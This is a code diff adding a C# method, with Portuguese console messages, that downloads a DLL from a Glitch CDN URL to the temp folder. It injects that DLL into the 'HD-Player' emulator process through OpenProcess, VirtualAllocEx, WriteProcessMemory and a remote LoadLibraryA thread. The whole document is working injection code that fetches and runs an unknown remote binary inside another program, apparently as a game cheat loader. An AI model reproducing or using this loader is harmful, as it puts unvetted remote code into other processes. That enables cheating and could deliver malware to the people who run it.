@@ -1,0 +1,98 @@
+static async Task InjectDLL()
+    {
+        string processName = "HD-Player";
+        string dllUrl = "https://cdn.glitch.global/8290189a-044c-494d-9957-5b2e993ca180/rqago1.dll?v=1726322804507";
+        string tempDllPath = Path.Combine(Path.GetTempPath(), "rqago1.dll");
+
+        Console.WriteLine("[*] Baixando DLL...");
+        try
+        {
+            using (var client = new WebClient())
+            {
+                client.DownloadFile(dllUrl, tempDllPath);
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Erro ao baixar a DLL: {ex.Message}");
+            return;
+        }
+
+        Console.WriteLine("[*] Verificando processo...");
+        Process[] processes = Process.GetProcessesByName(processName);
+        if (processes.Length == 0)
+        {
+            Console.WriteLine("❌ Emulador HD-Player não encontrado. Abra ele primeiro.");
+            return;
+        }
+
+        Process targetProcess = processes[0];
+        IntPtr hProcess = OpenProcess(
+            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+            false,
+            targetProcess.Id
+        );
+
+        if (hProcess == IntPtr.Zero)
+        {
+            Console.WriteLine("❌ Falha ao abrir o processo.");
+            return;
+        }
+
+        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+        if (loadLibraryAddr == IntPtr.Zero)
+        {
+            Console.WriteLine("❌ Não foi possível localizar LoadLibraryA.");
+            return;
+        }
+
+        IntPtr allocMemAddress = VirtualAllocEx(
+            hProcess,
+            IntPtr.Zero,
+            (IntPtr)(tempDllPath.Length + 1),
+            MEM_COMMIT,
+            PAGE_READWRITE
+        );
+
+        if (allocMemAddress == IntPtr.Zero)
+        {
+            Console.WriteLine("❌ Falha ao alocar memória no processo alvo.");
+            return;
+        }
+
+        byte[] dllBytes = Encoding.ASCII.GetBytes(tempDllPath);
+        bool success = WriteProcessMemory(
+            hProcess,
+            allocMemAddress,
+            dllBytes,
+            (uint)dllBytes.Length,
+            out _
+        );
+
+        if (!success)
+        {
+            Console.WriteLine("❌ Falha ao escrever na memória do processo.");
+            return;
+        }
+
+        IntPtr remoteThread = CreateRemoteThread(
+            hProcess,
+            IntPtr.Zero,
+            IntPtr.Zero,
+            loadLibraryAddr,
+            allocMemAddress,
+            0,
+            IntPtr.Zero
+        );
+
+        if (remoteThread == IntPtr.Zero)
+        {
+            Console.WriteLine("❌ Falha ao criar a thread remota.");
+        }
+        else
+        {
+            Console.Beep(400, 300);
+            Console.WriteLine("✅ DLL injetada com sucesso!");
+        }
+    }
+}
